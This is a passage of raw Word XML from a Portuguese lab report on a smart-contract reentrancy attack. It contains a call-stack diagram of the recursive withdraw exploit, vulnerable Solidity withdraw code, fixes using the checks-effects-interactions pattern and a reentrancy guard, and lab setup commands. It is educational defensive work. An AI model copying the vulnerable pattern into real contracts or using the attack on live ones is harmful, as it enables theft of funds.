          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: Transfere controle para o destinatário, permitindo execução de código arbitrário</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336A285C" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDN/>
        <w:spacing w:before="36" w:after="36" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Ausência de Proteção</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: Nenhum mecanismo impede chamadas recursivas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9B2FC3" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="163" w:name="_Toc213881960"/>
      <w:r>
        <w:t>6.3 Diagrama da Pilha de Chamadas</w:t>
      </w:r>
      <w:bookmarkEnd w:id="163"/>
    </w:p>
    <w:p w14:paraId="7E83F340" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>attack()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  └─&gt; deposit() [saldo interno: 1 ETH]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">  └─&gt; withdraw(1)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">      ├─&gt; check: 1 &gt;= 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:eastAsia="Consolas" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✓</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">      └─&gt; call() → fallback()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">          └─&gt; withdraw(1)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">              ├─&gt; check: 1 &gt;= 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:eastAsia="Consolas" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✓</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> [PROBLEMA: não foi atualizado!]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">              └─&gt; call() → fallback()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">                  └─&gt; withdraw(1)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">                      ├─&gt; check: 1 &gt;= 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:eastAsia="Consolas" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>✓</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">                      └─&gt; call() → fallback()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">                          └─&gt; ... [continua 26x]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2717CCEC" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00000000" w:rsidP="00224B0C">
      <w:r>
        <w:pict w14:anchorId="0386CF42">
          <v:rect id="_x0000_i1029" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="571D3826" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="164" w:name="_Toc213881961"/>
      <w:r>
        <w:t>7. Task 4: Implementação de Contramedidas</w:t>
      </w:r>
      <w:bookmarkEnd w:id="164"/>
    </w:p>
    <w:p w14:paraId="16FFEF69" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="165" w:name="_Toc213881962"/>
      <w:r>
        <w:t>7.1 Solução Implementada: Checks-Effects-Interactions Pattern</w:t>
      </w:r>
      <w:bookmarkEnd w:id="165"/>
    </w:p>
    <w:p w14:paraId="73904E4E"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Modificamos o contrato vítima seguindo o padrão CEI (Checks-Effects-Interactions):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02190B43"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Código Original (Vulnerável):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D1C5CF"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function withdraw(uint _amount) public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require(balances[msg.sender] &gt;= _amount);           // Check</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(bool sent, ) = msg.sender.call{value: _amount}(""); // Interaction</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require(sent, "Failed to send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balances[msg.sender] -= _amount;                    // Effect (ERRO: depois da interaction)</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p>
    <w:p w14:paraId="2B9E6015" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00371B58" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Código Corrigido:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D8D3DA"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function withdraw(uint _amount) public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require(balances[msg.sender] &gt;= _amount);           // Check</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balances[msg.sender] -= _amount;                    // Effect (CORRETO: antes da interaction)</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(bool sent, ) = msg.sender.call{value: _amount}(""); // Interaction</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require(sent, "Failed to send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p>
    <w:p w14:paraId="1A444450" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="166" w:name="_Toc213881963"/>
      <w:r>
        <w:t>7.2 Recompilação e Deploy</w:t>
      </w:r>
      <w:bookmarkEnd w:id="166"/>
    </w:p>
    <w:p w14:paraId="47FD7D1D"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Recompilamos o contrato corrigido:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B5A962" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pP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/Labsetup/contract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solc-0.6.8 </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="7D9029"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>--overwrite</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--abi</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--bin</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-o</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> . </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ReentrancyVictim.sol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E300B5C"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Deploy do contrato corrigido:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4430C4CE"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8000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>cd</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> /Labsetup/victim</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deploy_victim_contract.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFADA6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O script retornou o endereço do novo contrato corrigido. Financiamos este contrato com ETH para testar se a correção previne o ataque.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B991A13" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8A2C61" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="167" w:name="_Toc213881964"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>7.3 Teste do Ataque no Contrato Corrigido</w:t>
      </w:r>
      <w:bookmarkEnd w:id="167"/>
    </w:p>
    <w:p w14:paraId="7ED59180"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Atualizamos os scripts de ataque com o novo endereço e executamos:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623BDCE6"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python3 launch_attack.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D965812" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">O ataque falhou! </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A transação foi revertida.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBD6F52"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Análise do Erro:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D649341"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 xml:space="preserve">Na segunda tentativa de retirada recursiva: 1. O saldo já havia sido atualizado para 0 (devido à correção) 2. A tentativa de fazer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>balances[attacker] -= 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> quando o saldo é 0 causa underflow 3. Solidity 0.6.8 reverte a transação em caso de underflow aritmético</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0671DED6" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="168" w:name="_Toc213881965"/>
      <w:r>
        <w:t>7.4 Verificação dos Saldos</w:t>
      </w:r>
      <w:bookmarkEnd w:id="168"/>
    </w:p>
    <w:p w14:paraId="597E7063"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Após a tentativa de ataque falhada, verificamos que apenas 1 ETH foi retirado (o comportamento correto e esperado), enquanto o restante permaneceu seguro no contrato. A correção implementada preveniu com sucesso o ataque de reentrancy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AA6C17" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="169" w:name="_Toc213881966"/>
      <w:r>
        <w:t>7.5 Outras Soluções Avaliadas</w:t>
      </w:r>
      <w:bookmarkEnd w:id="169"/>
    </w:p>
    <w:p w14:paraId="3F019E4C"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Reentrancy Guard (OpenZeppelin):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C22B1AF"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Também testamos uma implementação com modifier:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A076BE1" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00371B58" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bool private locked;</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modifier noReentrant()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require(!locked, "No reentrancy!");</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locked = true;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_;</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locked = false;</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function withdraw(uint _amount) public noReentrant {</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require(balances[msg.sender] &gt;=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(bool sent, ) = msg.sender.call{value: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require(sent, "Failed to send Ether");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    balances[msg.sender] -= _amount;</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C2606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color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Esta solução também foi eficaz, revertendo a transação com “No reentrancy!” na segunda tentativa de entrada.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F8CB60" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="170" w:name="_Toc213881967"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>8. Apêndices</w:t>
      </w:r>
      <w:bookmarkEnd w:id="170"/>
    </w:p>
    <w:p w14:paraId="039EDCB3" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="171" w:name="_Toc213881968"/>
      <w:r>
        <w:t>8.1 Comandos Utilizados (Resumo)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="171"/>
    </w:p>
    <w:p w14:paraId="008562B3" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00371B58" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="60A0B0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t># Setup inicial</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="06287E"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>unzip</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Labsetup.zip </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="007020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>&amp;&amp;</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cd</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Labsetup</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">dcbuild </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="007020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>&amp;&amp;</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> dcup</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>pip3 install web3==5.31.1</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="60A0B0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t># Compilação</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cd</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> contract</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
